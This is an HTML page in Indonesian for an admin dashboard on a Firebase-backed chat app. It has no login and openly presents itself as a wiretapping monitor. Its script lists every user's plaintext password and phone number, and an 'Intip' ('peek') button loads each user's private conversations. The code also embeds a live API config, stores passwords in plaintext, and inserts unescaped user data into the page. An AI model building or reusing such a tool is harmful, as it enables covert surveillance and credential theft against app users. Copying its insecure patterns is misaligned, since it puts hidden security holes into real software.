<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Admin - Tanpa Login</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --bg: #020617; --card: #1e293b; --primary: #6366f1;
            --danger: #ef4444; --text: #f8fafc; --border: #334155;
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--bg); color: var(--text);
            margin: 0; display: flex; flex-direction: column; height: 100vh;
        }

        header {
            background: var(--card); padding: 20px 40px;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 2px solid var(--primary);
        }

        .stats-grid {
            display: grid; grid-template-columns: repeat(4, 1fr);
            gap: 20px; padding: 20px 40px;
        }

        .stat-box {
            background: var(--card); padding: 20px; border-radius: 12px;
            border: 1px solid var(--border); text-align: center;
        }

        .stat-box h3 { margin: 0; font-size: 0.8rem; color: #94a3b8; text-transform: uppercase; }
        .stat-box p { margin: 10px 0 0; font-size: 1.5rem; font-weight: 700; color: var(--primary); }

        main {
            display: grid; grid-template-columns: 1.5fr 1fr;
            gap: 20px; padding: 0 40px 40px; flex: 1; overflow: hidden;
        }

        .container {
            background: var(--card); border-radius: 16px;
            display: flex; flex-direction: column; overflow: hidden;
            border: 1px solid var(--border);
        }

        .container-header {
            padding: 15px 20px; background: rgba(255,255,255,0.05);
            font-weight: 700; border-bottom: 1px solid var(--border);
        }

        .scroll { flex: 1; overflow-y: auto; padding: 20px; }

        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; padding: 10px; color: #94a3b8; font-size: 0.75rem; border-bottom: 1px solid var(--border); }
        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }

        .pfp { width: 35px; height: 35px; border-radius: 50%; object-fit: cover; }
        .pw { font-family: monospace; color: #fbbf24; font-weight: bold; }
        .tag { padding: 3px 7px; border-radius: 4px; font-size: 0.65rem; font-weight: bold; }
        .Laki-laki { background: #1d4ed8; }
        .Perempuan { background: #be185d; }

        .btn-intip { background: var(--primary); border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
        .chat-log { background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 0.8rem; border-left: 3px solid var(--primary); }
    </style>
</head>
<body>

<header>
    <div>
        <h1 style="margin:0; font-size: 1.2rem;"><i class="fas fa-unlock-alt"></i> Dashboard Admin (Akses Langsung)</h1>
        <small style="color: #94a3b8;">Memantau seluruh database user & percakapan</small>
    </div>
    <div style="font-size: 0.8rem; background: #334155; padding: 5px 15px; border-radius: 20px;">
        <i class="fas fa-circle" style="color: #22c55e; font-size: 0.6rem;"></i> Server Aktif
    </div>
</header>

<div class="stats-grid">
    <div class="stat-box"><h3>Total User</h3><p id="sUser">0</p></div>
    <div class="stat-box"><h3>Laki-laki</h3><p id="sMale">0</p></div>
    <div class="stat-box"><h3>Perempuan</h3><p id="sFemale">0</p></div>
    <div class="stat-box"><h3>Data Akurat</h3><p>100%</p></div>
</div>

<main>
    <div class="container">
        <div class="container-header"><i class="fas fa-database"></i> Database User</div>
        <div class="scroll">
            <table>
                <thead>
                    <tr>
                        <th>PFP</th>
                        <th>ID / NAMA</th>
                        <th>PASSWORD</th>
                        <th>NO. HP</th>
                        <th>GENDER</th>
                        <th>AKSI</th>
                    </tr>
                </thead>
                <tbody id="userTable"></tbody>
            </table>
        </div>
    </div>

    <div class="container">
        <div class="container-header"><i class="fas fa-eye"></i> Monitor Chat (Penyadapan)</div>
        <div class="scroll" id="spyBox">
            <p style="text-align: center; color: #64748b; margin-top: 50px;">Klik tombol "Intip" pada user untuk melihat chat mereka.</p>
        </div>
    </div>
</main>

<script>
    // Konfigurasi Firebase Anda
    const firebaseConfig = {
        apiKey: "AIzaSyBSo0nFUKNBDmUX0wSFV_idAFWBRnnTcXE",
        authDomain: "fotobooth-e36ab.firebaseapp.com",
        databaseURL: "https://fotobooth-e36ab-default-rtdb.firebaseio.com",
        projectId: "fotobooth-e36ab",
        storageBucket: "fotobooth-e36ab.firebasestorage.app",
        messagingSenderId: "1040239629485",
        appId: "1:1040239629485:web:254a7b50a4243b6c5d6224"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Ambil Data User secara Real-time
    db.ref('users').on('value', snap => {
        const table = document.getElementById('userTable');
        table.innerHTML = "";
        let m = 0, f = 0, total = 0;

        snap.forEach(user => {
            const d = user.val();
            const id = user.key;
            total++;
            if(d.gender === 'Laki-laki') m++;
            if(d.gender === 'Perempuan') f++;

            table.innerHTML += `
                <tr>
                    <td><img src="${d.pfp || 'https://via.placeholder.com/50'}" class="pfp"></td>
                    <td><b>${id}</b><br><small>${d.nama}</small></td>
                    <td class="pw">${d.pw}</td>
                    <td>${d.wa || '-'}</td>
                    <td><span class="tag ${d.gender}">${d.gender || 'N/A'}</span></td>
                    <td><button class="btn-intip" onclick="sadap('${id}')">Intip</button></td>
                </tr>
            `;
        });
        document.getElementById('sUser').innerText = total;
        document.getElementById('sMale').innerText = m;
        document.getElementById('sFemale').innerText = f;
    });

    // Fungsi Sadap Chat
    function sadap(id) {
        const box = document.getElementById('spyBox');
        box.innerHTML = `<h3>Riwayat Chat: <span style="color:var(--primary)">${id}</span></h3>`;
        
        db.ref(`contacts/${id}`).once('value', snap => {
            if(!snap.exists()) {
                box.innerHTML += `<p>User ini belum memulai percakapan apa pun.</p>`;
                return;
            }

            snap.forEach(c => {
                const partner = c.key;
                const room = [id, partner].sort().join("_");
                
                const logDiv = document.createElement('div');
                logDiv.className = 'chat-log';
                logDiv.innerHTML = `<strong>Target chat dengan: ${partner}</strong><br>`;

                db.ref(`messages/${room}`).once('value', mSnap => {
                    mSnap.forEach(msg => {
                        const m = msg.val();
                        const dari = m.sender === id ? "Dia" : "Lawan";
                        logDiv.innerHTML += `<div style="margin-top:5px;"><b>${dari}:</b> ${m.text || '[Voice Note/Lainnya]'}</div>`;
                    });
                });
                box.appendChild(logDiv);
            });
        });
    }
</script>

</body>
</html>
